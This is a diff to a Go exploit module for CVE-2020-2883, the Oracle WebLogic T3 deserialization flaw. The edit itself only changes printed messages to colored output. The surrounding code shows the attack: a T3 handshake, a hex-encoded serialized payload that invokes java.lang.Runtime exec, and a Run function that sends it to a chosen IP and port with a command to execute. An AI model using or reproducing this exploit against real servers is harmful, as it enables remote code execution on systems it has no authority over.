@@ -3,6 +3,7 @@ package cve_2020_2883
 import (
 	"encoding/hex"
 	"fmt"
+	"github.com/gookit/color"
 	"net"
 	"strconv"
 	"time"
@@ -16,7 +17,7 @@ func t3handshake(conn net.Conn, server_addr string) {
 	hex_data, _ := hex.DecodeString("74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a")
 	_, err := conn.Write(hex_data)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	time.Sleep(1 * time.Second)
@@ -71,7 +72,7 @@ func Run(rip string, rport string, cmd string) {
 
 	conn, err := net.DialTimeout("tcp4", server_addr, 10*time.Second)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	defer conn.Close()
@@ -112,8 +113,8 @@ func Run(rip string, rport string, cmd string) {
 	PAYLOAD += "74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178"
 	res := sendEvilObjData(conn, PAYLOAD)
 	if res != nil {
-		fmt.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
+		color.Green.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
 	} else {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 	}
 }
